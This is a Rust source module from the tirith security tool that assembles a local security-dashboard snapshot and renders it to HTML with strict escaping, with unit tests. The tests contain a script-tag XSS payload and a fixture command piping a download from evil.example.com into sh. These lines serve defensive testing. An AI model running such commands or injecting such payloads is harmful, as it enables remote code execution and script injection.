//! M13 ch3 — `tirith dashboard` snapshot model + self-contained HTML renderer.
//!
//! This module is the SECURITY-SENSITIVE half of the dashboard feature: it
//! assembles a [`DashboardSnapshot`] (pure, serde-serializable data — no HTML)
//! from existing read-only sources, then renders it into a STATIC,
//! self-contained HTML report from an embedded template.
//!
//! # Data sources (all read-only; degrade to "unavailable")
//!
//! * **Audit summary** — a 7-day window over the JSONL audit log read by
//!   [`crate::audit_aggregator::read_log`] + [`crate::audit_aggregator::compute_stats`].
//!   Counts by action, top findings (rule IDs), and a best-effort top-hosts
//!   tally extracted from the already-REDACTED command previews.
//! * **Policy** — [`crate::policy::Policy::discover`] summarized (paranoia,
//!   fail mode, allowlist / blocklist / custom-rule counts).
//! * **Threat DB** — [`crate::threatdb::ThreatDb`] header/stats, mirroring
//!   `tirith threat-db status`. Degrades to "not installed".
//! * **Trust + canaries** — the user/repo `trust.json` stores (read directly,
//!   the same format `tirith trust` writes) and [`crate::canary::list`].
//! * **Shell hook** — supplied by the CLI caller (it owns the read-only profile
//!   probe `tirith onboard` / `doctor` use); core never materializes hooks.
//!
//! # The escaping invariant (local-report XSS)
//!
//! Audit entries carry redacted command previews and file paths built from
//! USER-CONTROLLED bytes. Interpolating them raw into HTML is a local-report
//! XSS: a pasted `<script>…` would execute when the operator opens the file (or
//! views it over the loopback `serve`). Therefore EVERY value substituted into
//! the template passes through [`html_escape`] — [`render_html`] has no
//! "raw/unescaped" interpolation path. See `escaping_neutralizes_script_tag`.
//!
//! The snapshot itself stores RAW (unescaped) strings — escaping happens only at
//! the HTML boundary. The `--json` surface emits the raw snapshot (JSON is not an
//! HTML execution context; a consumer that re-renders it into HTML is
//! responsible for its own escaping, exactly as with every other tirith `--json`
//! output).

use std::collections::HashMap;
use std::path::Path;

use serde::{Deserialize, Serialize};

use crate::audit_aggregator::{self, AuditFilter, AuditRecord};

/// The default look-back window, in days, for the audit summary.
pub const DEFAULT_WINDOW_DAYS: i64 = 7;

/// How many top findings / hosts the snapshot surfaces.
const TOP_N: usize = 10;

/// The embedded HTML template. Compiled into the binary so the report is
/// self-contained and the CLI never has to locate an on-disk asset.
const TEMPLATE_HTML: &str = include_str!("../assets/dashboard/template.html");

// ---------------------------------------------------------------------------
// Snapshot model — PURE DATA. No HTML, no I/O. serde-serializable for `--json`.
// ---------------------------------------------------------------------------

/// A point-in-time, local-only security snapshot. Pure data: assembled by
/// [`build_snapshot`], rendered by [`render_html`], or serialized as-is for
/// `--json`. Strings are stored RAW (unescaped); escaping is applied only when
/// rendering HTML.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DashboardSnapshot {
    /// Stable schema version (bump on a breaking field change).
    pub schema_version: u32,
    /// RFC-3339 UTC timestamp this snapshot was assembled.
    pub generated_at: String,
    /// The audit look-back window in days.
    pub window_days: i64,
    /// RFC-3339 UTC lower bound of the window (`generated_at - window_days`).
    pub window_start: String,
    /// RFC-3339 UTC upper bound of the window (== `generated_at`).
    pub window_end: String,

    /// The 7-day audit summary, or `None` when the log is absent / unreadable.
    pub audit: Option<AuditSummary>,
    /// Policy summary (always present — an absent policy collapses to defaults).
    pub policy: PolicySummary,
    /// Threat-DB status (always present; `installed = false` when none).
    pub threatdb: ThreatDbSummary,
    /// Trust-store + canary summary (always present; counts may be zero).
    pub trust: TrustSummary,
    /// Shell-hook install state, supplied by the CLI caller.
    pub hook: HookSummary,
}

/// A 7-day audit summary distilled from the JSONL log.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AuditSummary {
    /// Verdict-bearing commands seen in the window.
    pub total_commands: usize,
    /// Total findings across those commands.
    pub total_findings: usize,
    /// Block rate in `[0.0, 1.0]`.
    pub block_rate: f64,
    /// Distinct sessions seen.
    pub sessions_seen: usize,
    /// Count by action (`Allow` / `Warn` / `Block` / …), sorted by action name.
    pub actions: Vec<(String, usize)>,
    /// Top rule IDs by occurrence (descending), capped at [`TOP_N`].
    pub top_findings: Vec<(String, usize)>,
    /// Top hosts by occurrence (descending), capped at [`TOP_N`]. Best-effort:
    /// extracted from the REDACTED command previews, so it may be empty even
    /// when commands were seen.
    pub top_hosts: Vec<(String, usize)>,
    /// Audit lines that failed to parse (surfaced so a corrupt log is visible).
    pub skipped_lines: usize,
}

/// A summary of the effective discovered policy.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PolicySummary {
    /// Paranoia tier (1–4).
    pub paranoia: u8,
    /// `"open"` or `"closed"`.
    pub fail_mode: String,
    /// Number of allowlist entries (flat patterns).
    pub allowlist_count: usize,
    /// Number of rule-scoped allowlist entries.
    pub allowlist_rules_count: usize,
    /// Number of blocklist entries.
    pub blocklist_count: usize,
    /// Number of custom rules.
    pub custom_rules_count: usize,
    /// Discovered policy path, if any.
    pub path: Option<String>,
}

/// Threat-DB status, mirroring `tirith threat-db status`.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ThreatDbSummary {
    /// A DB file is present and loaded.
    pub installed: bool,
    /// Expected / actual DB path.
    pub path: Option<String>,
    /// Age of the DB in hours (when installed).
    pub age_hours: Option<f64>,
    /// DB build sequence (when installed).
    pub build_sequence: Option<u64>,
    /// Total records across all sections (when installed).
    pub total_entries: Option<u64>,
    /// Ed25519 signature verified (when installed).
    pub signature_valid: Option<bool>,
    /// Load/parse error, if the DB exists but could not be read.
    pub error: Option<String>,
}

/// Trust-store + canary summary.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TrustSummary {
    /// Non-expired trust entries in the USER store (`config_dir()/trust.json`).
    pub user_trust_count: usize,
    /// Non-expired trust entries in the REPO store (`.tirith/trust.json`).
    pub repo_trust_count: usize,
    /// Registered canary tokens.
    pub canary_count: usize,
    /// Canary tokens with an opt-in callback URL configured.
    pub canary_with_callback: usize,
}

/// Shell-hook install state. Populated by the CLI caller (which owns the
/// read-only profile probe); core does not detect or materialize hooks.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HookSummary {
    /// The detected interactive shell (e.g. `"zsh"`), or `"unknown"`.
    pub shell: String,
    /// The hook line is present in the shell's profile.
    pub installed: bool,
}

// ---------------------------------------------------------------------------
// Snapshot assembly
// ---------------------------------------------------------------------------

/// Assemble a [`DashboardSnapshot`].
///
/// * `audit_log` — path to the JSONL audit log, or `None` to use the default
///   ([`crate::audit::audit_log_path`]). When the file is absent or unreadable
///   the `audit` field degrades to `None` rather than failing.
/// * `cwd` — directory used for policy / trust discovery (walks up to `.git`).
///   `None` uses the process cwd.
/// * `hook` — shell-hook state from the caller's read-only probe.
///
/// Pure with respect to the working tree: it only READS the audit log, policy,
/// threat DB, trust stores, and canary store. It never writes or materializes
/// anything.
pub fn build_snapshot(
    audit_log: Option<&Path>,
    cwd: Option<&str>,
    hook: HookSummary,
) -> DashboardSnapshot {
    let now = chrono::Utc::now();
    let window_start = now - chrono::Duration::days(DEFAULT_WINDOW_DAYS);

    let audit = build_audit_summary(audit_log, &window_start.to_rfc3339(), &now.to_rfc3339());
    let policy = build_policy_summary(cwd);
    let threatdb = build_threatdb_summary();
    let trust = build_trust_summary(cwd);

    DashboardSnapshot {
        schema_version: 1,
        generated_at: now.to_rfc3339(),
        window_days: DEFAULT_WINDOW_DAYS,
        window_start: window_start.to_rfc3339(),
        window_end: now.to_rfc3339(),
        audit,
        policy,
        threatdb,
        trust,
        hook,
    }
}

/// Build the 7-day audit summary. Returns `None` when no log path resolves or
/// the file cannot be read (a fresh install with no log is the common case).
fn build_audit_summary(audit_log: Option<&Path>, since: &str, until: &str) -> Option<AuditSummary> {
    let path = match audit_log {
        Some(p) => p.to_path_buf(),
        None => crate::audit::audit_log_path()?,
    };
    if !path.exists() {
        return None;
    }
    let read = audit_aggregator::read_log(&path).ok()?;

    let filter = AuditFilter {
        since: Some(since.to_string()),
        until: Some(until.to_string()),
        entry_type: Some("verdict".to_string()),
        ..Default::default()
    };
    let windowed = audit_aggregator::filter_records(&read.records, &filter);
    let stats = audit_aggregator::compute_stats(&windowed);

    let mut actions: Vec<(String, usize)> = stats.actions.into_iter().collect();
    actions.sort_by(|a, b| a.0.cmp(&b.0));

    let top_hosts = top_hosts(&windowed);

    Some(AuditSummary {
        total_commands: stats.total_commands,
        total_findings: stats.total_findings,
        block_rate: stats.block_rate,
        sessions_seen: stats.sessions_seen,
        actions,
        top_findings: stats.top_rules,
        top_hosts,
        skipped_lines: read.skipped_lines,
    })
}

/// Best-effort top-hosts tally from the REDACTED command previews.
///
/// The audit `command_redacted` field is DLP-redacted and truncated to 80
/// bytes, so this is intentionally lossy — a host whose URL was truncated or
/// redacted simply does not appear. We reuse the engine's own URL extractor
/// (`extract::extract_urls`) + host parser (`parse::extract_raw_host`) so the
/// notion of "a host" matches the rest of tirith rather than a bespoke regex.
fn top_hosts(records: &[AuditRecord]) -> Vec<(String, usize)> {
    let mut counts: HashMap<String, usize> = HashMap::new();
    for r in records {
        let urls =
            crate::extract::extract_urls(&r.command_redacted, crate::tokenize::ShellType::Posix);
        for u in urls {
            if let Some(host) = u.parsed.host() {
                let host = host.trim().to_ascii_lowercase();
                if !host.is_empty() {
                    *counts.entry(host).or_insert(0) += 1;
                }
            }
        }
    }
    let mut hosts: Vec<(String, usize)> = counts.into_iter().collect();
    // Sort by descending count, then host name for a stable, deterministic order.
    hosts.sort_by(|a, b| b.1.cmp(&a.1).then_with(|| a.0.cmp(&b.0)));
    hosts.truncate(TOP_N);
    hosts
}

/// Summarize the discovered policy. An absent policy collapses to the defaults
/// `Policy::discover` returns, so this is always populated.
fn build_policy_summary(cwd: Option<&str>) -> PolicySummary {
    let policy = crate::policy::Policy::discover(cwd);
    PolicySummary {
        paranoia: policy.paranoia,
        fail_mode: match policy.fail_mode {
            crate::policy::FailMode::Open => "open".to_string(),
            crate::policy::FailMode::Closed => "closed".to_string(),
        },
        allowlist_count: policy.allowlist.len(),
        allowlist_rules_count: policy.allowlist_rules.len(),
        blocklist_count: policy.blocklist.len(),
        custom_rules_count: policy.custom_rules.len(),
        path: policy.path.clone(),
    }
}

/// Summarize threat-DB status, mirroring `tirith threat-db status`. Degrades to
/// `installed = false` when no DB file is present.
fn build_threatdb_summary() -> ThreatDbSummary {
    use crate::threatdb::ThreatDb;

    let db_path = ThreatDb::default_path();
    let path_str = db_path.as_ref().map(|p| p.display().to_string());

    let exists = db_path.as_ref().map(|p| p.exists()).unwrap_or(false);
    if !exists {
        return ThreatDbSummary {
            installed: false,
            path: path_str,
            age_hours: None,
            build_sequence: None,
            total_entries: None,
            signature_valid: None,
            error: None,
        };
    }

    let path_ref = db_path.as_ref().expect("path exists when exists==true");
    match ThreatDb::load_from_path(path_ref, 0) {
        Ok(db) => {
            let sig_valid = db.verify_signature().is_ok();
            let stats = db.stats();
            let now = chrono::Utc::now().timestamp().max(0) as u64;
            let age_hours = now.saturating_sub(stats.build_timestamp) as f64 / 3600.0;
            let total = stats.package_count as u64
                + stats.hostname_count as u64
                + stats.ip_count as u64
                + stats.typosquat_count as u64
                + stats.popular_count as u64;
            ThreatDbSummary {
                installed: true,
                path: path_str,
                age_hours: Some(age_hours),
                build_sequence: Some(stats.build_sequence),
                total_entries: Some(total),
                signature_valid: Some(sig_valid),
                error: None,
            }
        }
        Err(e) => ThreatDbSummary {
            installed: true,
            path: path_str,
            age_hours: None,
            build_sequence: None,
            total_entries: None,
            signature_valid: None,
            error: Some(e.to_string()),
        },
    }
}

/// The minimal `trust.json` shape needed to count non-expired entries. Mirrors
/// the format `tirith trust` writes (`{version, entries:[{ttl_expires, …}]}`),
/// but kept local + lenient (extra fields ignored) so core does not depend on
/// the CLI crate's struct.
#[derive(Debug, Deserialize)]
struct TrustStoreFile {
    #[serde(default)]
    entries: Vec<TrustEntryFile>,
}

#[derive(Debug, Deserialize)]
struct TrustEntryFile {
    #[serde(default)]
    ttl_expires: Option<String>,
}

/// Count non-expired entries in a `trust.json` at `path`. A missing or
/// unparseable file counts as zero (degrade gracefully — never panic).
fn count_trust_entries(path: &Path) -> usize {
    let Ok(content) = std::fs::read_to_string(path) else {
        return 0;
    };
    let Ok(store) = serde_json::from_str::<TrustStoreFile>(&content) else {
        return 0;
    };
    let now = chrono::Utc::now();
    store
        .entries
        .iter()
        .filter(|e| match &e.ttl_expires {
            None => true, // permanent
            Some(ts) => match chrono::DateTime::parse_from_rfc3339(ts) {
                Ok(expiry) => expiry > now,
                // An unparseable expiry is treated as still-valid (matches the
                // CLI's lenient handling — we never silently drop an entry we
                // cannot interpret).
                Err(_) => true,
            },
        })
        .count()
}

/// Summarize the trust stores + canary store. All sources degrade to zero when
/// absent.
fn build_trust_summary(cwd: Option<&str>) -> TrustSummary {
    let user_trust_count = crate::policy::config_dir()
        .map(|d| count_trust_entries(&d.join("trust.json")))
        .unwrap_or(0);

    let repo_trust_count = crate::policy::find_repo_root(cwd)
        .map(|root| count_trust_entries(&root.join(".tirith").join("trust.json")))
        .unwrap_or(0);

    let canaries = crate::canary::list();
    let canary_count = canaries.len();
    let canary_with_callback = canaries.iter().filter(|c| c.callback_url.is_some()).count();

    TrustSummary {
        user_trust_count,
        repo_trust_count,
        canary_count,
        canary_with_callback,
    }
}

// ---------------------------------------------------------------------------
// HTML rendering — the ONLY place snapshot strings cross into HTML.
// ---------------------------------------------------------------------------

/// Number of random bytes in a `serve` token before hex-encoding. 32 bytes =
/// 256 bits of OS entropy → a 64-char hex token.
const SERVE_TOKEN_BYTES: usize = 32;

/// Generate a fresh ephemeral token for `tirith dashboard serve`:
/// [`SERVE_TOKEN_BYTES`] of OS entropy, lower-hex encoded.
///
/// Uses `getrandom::fill` — the SAME OS CSPRNG the canary store and the
/// per-install baseline salt draw from (no new crypto dependency). It lives in
/// core so the CLI does not need its own RNG dep. On the (astronomically
/// unlikely) event entropy is unavailable it returns `Err` rather than emitting
/// a guessable token — a weak token would defeat the whole loopback guard.
pub fn generate_serve_token() -> Result<String, String> {
    let mut buf = [0u8; SERVE_TOKEN_BYTES];
    getrandom::fill(&mut buf).map_err(|e| format!("OS RNG unavailable: {e}"))?;
    let mut hex = String::with_capacity(SERVE_TOKEN_BYTES * 2);
    for b in buf {
        use std::fmt::Write as _;
        // Infallible write into a String.
        let _ = write!(hex, "{b:02x}");
    }
    Ok(hex)
}

/// Escape HTML special characters for safe interpolation into the report.
///
/// The order matters: `&` MUST be escaped FIRST, otherwise the `&` introduced
/// by a later replacement (e.g. `<` → `&lt;`) would itself be re-escaped into
/// `&amp;lt;`. After that the remaining characters are independent.
///
/// Covers the five characters that can break out of HTML text / attribute
/// contexts: `&`, `<`, `>`, `"`, `'`. (`'` is escaped as the numeric
/// `&#x27;` because the named `&apos;` is not defined in HTML4.)
pub fn html_escape(s: &str) -> String {
    s.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
        .replace('\'', "&#x27;")
}

/// Render a [`DashboardSnapshot`] into a self-contained HTML report.
///
/// EVERY interpolated value passes through [`html_escape`]; there is no
/// raw-interpolation path. Numeric values are formatted via `format!` (no
/// user-controlled bytes) but still composed only into escaped text nodes.
pub fn render_html(snap: &DashboardSnapshot) -> String {
    // The full substitution table. The values are pre-escaped here so the
    // template fill is a single uniform pass — no caller can add a "raw" entry.
    let block_rate = snap
        .audit
        .as_ref()
        .map(|a| format!("{:.1}%", a.block_rate * 100.0))
        .unwrap_or_else(|| "—".to_string());
    let (total_commands, total_findings, sessions_seen) = snap
        .audit
        .as_ref()
        .map(|a| {
            (
                a.total_commands.to_string(),
                a.total_findings.to_string(),
                a.sessions_seen.to_string(),
            )
        })
        .unwrap_or_else(|| ("—".to_string(), "—".to_string(), "—".to_string()));

    let subs: &[(&str, String)] = &[
        ("{{GENERATED_AT}}", html_escape(&snap.generated_at)),
        (
            "{{WINDOW_DAYS}}",
            html_escape(&snap.window_days.to_string()),
        ),
        ("{{WINDOW_START}}", html_escape(&snap.window_start)),
        ("{{WINDOW_END}}", html_escape(&snap.window_end)),
        ("{{TOTAL_COMMANDS}}", html_escape(&total_commands)),
        ("{{TOTAL_FINDINGS}}", html_escape(&total_findings)),
        ("{{BLOCK_RATE}}", html_escape(&block_rate)),
        ("{{SESSIONS_SEEN}}", html_escape(&sessions_seen)),
        ("{{ACTIVITY_SECTION}}", render_activity(&snap.audit)),
        (
            "{{TOP_FINDINGS_SECTION}}",
            render_count_table(
                snap.audit.as_ref().map(|a| a.top_findings.as_slice()),
                "Rule",
                "No findings recorded in this window.",
            ),
        ),
        (
            "{{TOP_HOSTS_SECTION}}",
            render_count_table(
                snap.audit.as_ref().map(|a| a.top_hosts.as_slice()),
                "Host",
                "No hosts extracted from the recorded commands in this window.",
            ),
        ),
        ("{{POLICY_SECTION}}", render_policy(&snap.policy)),
        ("{{THREATDB_SECTION}}", render_threatdb(&snap.threatdb)),
        ("{{TRUST_SECTION}}", render_trust(&snap.trust)),
        ("{{HOOK_SECTION}}", render_hook(&snap.hook)),
    ];

    let mut html = TEMPLATE_HTML.to_string();
    for (marker, value) in subs {
        html = html.replace(marker, value);
    }
    html
}

/// A `<table>` of `(key, count)` rows, or an `unavailable`/`empty` note.
fn render_count_table(
    rows: Option<&[(String, usize)]>,
    key_header: &str,
    empty_msg: &str,
) -> String {
    match rows {
        None => format!(
            "<p class=\"unavailable\">{}</p>",
            html_escape("Audit log unavailable — no data for this section.")
        ),
        Some([]) => format!("<p class=\"empty\">{}</p>", html_escape(empty_msg)),
        Some(rows) => {
            let mut s = format!(
                "<table><tr><th>{}</th><th>Count</th></tr>",
                html_escape(key_header)
            );
            for (k, count) in rows {
                s.push_str(&format!(
                    "<tr><td>{}</td><td>{}</td></tr>",
                    html_escape(k),
                    html_escape(&count.to_string()),
                ));
            }
            s.push_str("</table>");
            s
        }
    }
}

/// The action breakdown table (or an unavailable note when no audit log).
fn render_activity(audit: &Option<AuditSummary>) -> String {
    let Some(a) = audit else {
        return format!(
            "<p class=\"unavailable\">{}</p>",
            html_escape("No audit log found. Once tirith logs activity it will appear here.")
        );
    };
    let mut s = String::new();
    if a.actions.is_empty() {
        s.push_str(&format!(
            "<p class=\"empty\">{}</p>",
            html_escape("No commands recorded in this window.")
        ));
    } else {
        s.push_str("<table><tr><th>Action</th><th>Count</th></tr>");
        for (action, count) in &a.actions {
            s.push_str(&format!(
                "<tr><td>{}</td><td>{}</td></tr>",
                html_escape(action),
                html_escape(&count.to_string()),
            ));
        }
        s.push_str("</table>");
    }
    if a.skipped_lines > 0 {
        s.push_str(&format!(
            "<p class=\"unavailable\">{}</p>",
            html_escape(&format!(
                "{} audit line(s) could not be parsed and were skipped.",
                a.skipped_lines
            ))
        ));
    }
    s
}

/// The policy key/value block.
fn render_policy(p: &PolicySummary) -> String {
    let path = p.path.as_deref().unwrap_or("(none — built-in defaults)");
    format!(
        "<div class=\"kv\">\
         <div><span class=\"k\">Paranoia tier</span>{}</div>\
         <div><span class=\"k\">Fail mode</span>{}</div>\
         <div><span class=\"k\">Allowlist entries</span>{}</div>\
         <div><span class=\"k\">Allowlist rules</span>{}</div>\
         <div><span class=\"k\">Blocklist entries</span>{}</div>\
         <div><span class=\"k\">Custom rules</span>{}</div>\
         <div><span class=\"k\">Policy file</span><code>{}</code></div>\
         </div>",
        html_escape(&p.paranoia.to_string()),
        html_escape(&p.fail_mode),
        html_escape(&p.allowlist_count.to_string()),
        html_escape(&p.allowlist_rules_count.to_string()),
        html_escape(&p.blocklist_count.to_string()),
        html_escape(&p.custom_rules_count.to_string()),
        html_escape(path),
    )
}

/// The threat-DB key/value block.
fn render_threatdb(t: &ThreatDbSummary) -> String {
    if !t.installed {
        let path = t.path.as_deref().unwrap_or("(unknown)");
        return format!(
            "<p class=\"unavailable\">{} <code>{}</code></p>",
            html_escape("Threat DB not installed — run `tirith threat-db update`. Expected at"),
            html_escape(path),
        );
    }
    if let Some(err) = &t.error {
        return format!(
            "<p class=\"unavailable\">{} {}</p>",
            html_escape("Threat DB present but could not be loaded:"),
            html_escape(err),
        );
    }
    let age = t
        .age_hours
        .map(|h| format!("{h:.1} h"))
        .unwrap_or_else(|| "—".to_string());
    let seq = t
        .build_sequence
        .map(|s| s.to_string())
        .unwrap_or_else(|| "—".to_string());
    let total = t
        .total_entries
        .map(|n| n.to_string())
        .unwrap_or_else(|| "—".to_string());
    let sig = match t.signature_valid {
        Some(true) => "<span class=\"pill pill-ok\">verified</span>".to_string(),
        Some(false) => "<span class=\"pill pill-warn\">unverified</span>".to_string(),
        None => html_escape("—"),
    };
    format!(
        "<div class=\"kv\">\
         <div><span class=\"k\">Build sequence</span>{}</div>\
         <div><span class=\"k\">Age</span>{}</div>\
         <div><span class=\"k\">Total entries</span>{}</div>\
         <div><span class=\"k\">Signature</span>{}</div>\
         </div>",
        html_escape(&seq),
        html_escape(&age),
        html_escape(&total),
        sig,
    )
}

/// The trust + canary key/value block.
fn render_trust(t: &TrustSummary) -> String {
    format!(
        "<div class=\"kv\">\
         <div><span class=\"k\">User trust entries</span>{}</div>\
         <div><span class=\"k\">Repo trust entries</span>{}</div>\
         <div><span class=\"k\">Canary tokens</span>{}</div>\
         <div><span class=\"k\">Canaries with callback</span>{}</div>\
         </div>",
        html_escape(&t.user_trust_count.to_string()),
        html_escape(&t.repo_trust_count.to_string()),
        html_escape(&t.canary_count.to_string()),
        html_escape(&t.canary_with_callback.to_string()),
    )
}

/// The shell-hook status block.
fn render_hook(h: &HookSummary) -> String {
    let pill = if h.installed {
        "<span class=\"pill pill-ok\">installed</span>"
    } else {
        "<span class=\"pill pill-off\">not installed</span>"
    };
    format!(
        "<div class=\"kv\">\
         <div><span class=\"k\">Detected shell</span>{}</div>\
         <div><span class=\"k\">Hook status</span>{}</div>\
         </div>",
        html_escape(&h.shell),
        pill,
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    fn empty_snapshot() -> DashboardSnapshot {
        DashboardSnapshot {
            schema_version: 1,
            generated_at: "2026-05-31T00:00:00+00:00".into(),
            window_days: 7,
            window_start: "2026-05-24T00:00:00+00:00".into(),
            window_end: "2026-05-31T00:00:00+00:00".into(),
            audit: None,
            policy: PolicySummary {
                paranoia: 1,
                fail_mode: "open".into(),
                allowlist_count: 0,
                allowlist_rules_count: 0,
                blocklist_count: 0,
                custom_rules_count: 0,
                path: None,
            },
            threatdb: ThreatDbSummary {
                installed: false,
                path: None,
                age_hours: None,
                build_sequence: None,
                total_entries: None,
                signature_valid: None,
                error: None,
            },
            trust: TrustSummary {
                user_trust_count: 0,
                repo_trust_count: 0,
                canary_count: 0,
                canary_with_callback: 0,
            },
            hook: HookSummary {
                shell: "zsh".into(),
                installed: false,
            },
        }
    }

    // -----------------------------------------------------------------------
    // Invariant A — HTML escaping. EVERY interpolated value must pass through
    // html_escape; a `<script>` in a redacted command preview must never
    // appear literally in the rendered HTML.
    // -----------------------------------------------------------------------

    #[test]
    fn html_escape_orders_ampersand_first() {
        // `&` first, so a `<` that becomes `&lt;` is not re-escaped to `&amp;lt;`.
        assert_eq!(html_escape("a & b"), "a &amp; b");
        assert_eq!(html_escape("<tag>"), "&lt;tag&gt;");
        assert_eq!(html_escape("\"q\""), "&quot;q&quot;");
        assert_eq!(html_escape("it's"), "it&#x27;s");
        // Combined: a single ampersand is escaped exactly once.
        assert_eq!(
            html_escape("<a href=\"x&y\">'</a>"),
            "&lt;a href=&quot;x&amp;y&quot;&gt;&#x27;&lt;/a&gt;"
        );
    }

    #[test]
    fn escaping_neutralizes_script_tag() {
        // PINNED TEST (invariant A): a snapshot whose redacted preview carries a
        // `<script>` payload must render escaped — never as a live tag.
        let mut snap = empty_snapshot();
        snap.audit = Some(AuditSummary {
            total_commands: 1,
            total_findings: 1,
            block_rate: 1.0,
            sessions_seen: 1,
            actions: vec![("Block".into(), 1)],
            // The hostile payload lands in BOTH a findings row and a hosts row so
            // we cover the count-table render path with attacker bytes.
            top_findings: vec![("<script>alert(1)</script>".into(), 1)],
            top_hosts: vec![("<script>alert('xss')</script>".into(), 1)],
            skipped_lines: 0,
        });

        let html = render_html(&snap);

        assert!(
            html.contains("&lt;script&gt;"),
            "the script tag must be HTML-escaped in the output"
        );
        assert!(
            !html.contains("<script>alert(1)</script>"),
            "a literal <script>alert(1)</script> must NOT appear in the rendered HTML"
        );
        assert!(
            !html.contains("<script>alert('xss')</script>"),
            "a literal <script>alert('xss')</script> must NOT appear in the rendered HTML"
        );
        // The single-quote in the host payload is escaped numerically.
        assert!(
            html.contains("&#x27;xss&#x27;"),
            "single quotes in attacker bytes must be escaped as &#x27;"
        );
    }

    #[test]
    fn render_html_has_no_unreplaced_placeholders() {
        // Every `{{…}}` marker in the template must be substituted — an
        // unreplaced marker would mean a section silently rendered nothing.
        let html = render_html(&empty_snapshot());
        assert!(
            !html.contains("{{"),
            "no template placeholder may survive rendering: {html}"
        );
        // The template must remain self-contained: no external resource loads.
        let lower = html.to_ascii_lowercase();
        assert!(!lower.contains("http://"), "no external http resource");
        assert!(!lower.contains("https://"), "no external https resource");
        assert!(!lower.contains("<script"), "no <script> element at all");
        assert!(
            !lower.contains("src=") && !lower.contains("href="),
            "no src=/href= external references"
        );
    }

    #[test]
    fn unavailable_sections_render_gracefully() {
        // A fully-empty snapshot (no audit log, no threat DB) must still render a
        // complete document with the documented "unavailable" affordances.
        let html = render_html(&empty_snapshot());
        assert!(html.contains("No audit log found"));
        assert!(html.contains("Threat DB not installed"));
        assert!(html.contains("not installed")); // hook pill
        assert!(html.contains("Tirith Security Dashboard"));
    }

    #[test]
    fn snapshot_is_serde_round_trippable() {
        let snap = empty_snapshot();
        let json = serde_json::to_string(&snap).expect("serialize");
        let back: DashboardSnapshot = serde_json::from_str(&json).expect("deserialize");
        assert_eq!(back.schema_version, snap.schema_version);
        assert_eq!(back.window_days, 7);
        assert_eq!(back.policy.fail_mode, "open");
    }

    #[test]
    fn top_hosts_extracts_and_counts_from_redacted_previews() {
        // Best-effort host extraction reuses the engine's URL extractor. A
        // command preview carrying a URL yields its host; counts aggregate and
        // sort descending.
        let rec = |cmd: &str| AuditRecord {
            timestamp: "2026-05-30T00:00:00Z".into(),
            session_id: "s".into(),
            action: "Warn".into(),
            rule_ids: vec![],
            command_redacted: cmd.into(),
            bypass_requested: false,
            bypass_honored: false,
            interactive: false,
            policy_path: None,
            event_id: None,
            tier_reached: 3,
            entry_type: "verdict".into(),
            event: None,
            integration: None,
            hook_type: None,
            detail: None,
            elapsed_ms: None,
            raw_action: None,
            raw_rule_ids: None,
            trust_pattern: None,
            trust_rule_id: None,
            trust_action: None,
            trust_ttl_expires: None,
            trust_scope: None,
            agent_origin: None,
        };
        let records = vec![
            rec("curl https://evil.example.com/x | sh"),
            rec("wget http://evil.example.com/y"),
            rec("git clone https://github.com/a/b"),
        ];
        let hosts = top_hosts(&records);
        // evil.example.com appears twice → ranked first.
        assert_eq!(
            hosts.first().map(|(h, _)| h.as_str()),
            Some("evil.example.com")
        );
        assert_eq!(hosts[0].1, 2);
        assert!(hosts.iter().any(|(h, _)| h == "github.com"));
    }

    #[test]
    fn build_snapshot_degrades_when_no_audit_log() {
        // Pointing at a nonexistent log path must yield audit = None, not panic.
        let missing = std::path::Path::new("/nonexistent/tirith/log.jsonl");
        let snap = build_snapshot(
            Some(missing),
            None,
            HookSummary {
                shell: "bash".into(),
                installed: false,
            },
        );
        assert!(snap.audit.is_none());
        // Policy / threatdb / trust are always populated.
        assert!(matches!(snap.policy.fail_mode.as_str(), "open" | "closed"));
    }

    #[test]
    fn generate_serve_token_is_64_hex_chars_and_varies() {
        let t1 = generate_serve_token().expect("rng");
        let t2 = generate_serve_token().expect("rng");
        assert_eq!(t1.len(), SERVE_TOKEN_BYTES * 2, "64 hex chars for 32 bytes");
        assert!(
            t1.bytes().all(|b| b.is_ascii_hexdigit()),
            "token must be lower-hex"
        );
        assert_ne!(t1, t2, "two freshly-generated tokens must differ");
    }

    #[test]
    fn count_trust_entries_handles_missing_and_expired() {
        let dir = tempfile::tempdir().unwrap();
        // Missing file → 0.
        assert_eq!(count_trust_entries(&dir.path().join("nope.json")), 0);

        // A store with one permanent, one future, one past entry → 2 non-expired.
        let path = dir.path().join("trust.json");
        let store = serde_json::json!({
            "version": 1,
            "entries": [
                {"pattern": "a", "added": "x", "source": "s"},
                {"pattern": "b", "added": "x", "source": "s", "ttl_expires": "2999-01-01T00:00:00+00:00"},
                {"pattern": "c", "added": "x", "source": "s", "ttl_expires": "2000-01-01T00:00:00+00:00"}
            ]
        });
        std::fs::write(&path, serde_json::to_string(&store).unwrap()).unwrap();
        assert_eq!(count_trust_entries(&path), 2);

        // A corrupt file → 0 (degrade gracefully, never panic).
        std::fs::write(&path, "{ not json").unwrap();
        assert_eq!(count_trust_entries(&path), 0);
    }
}
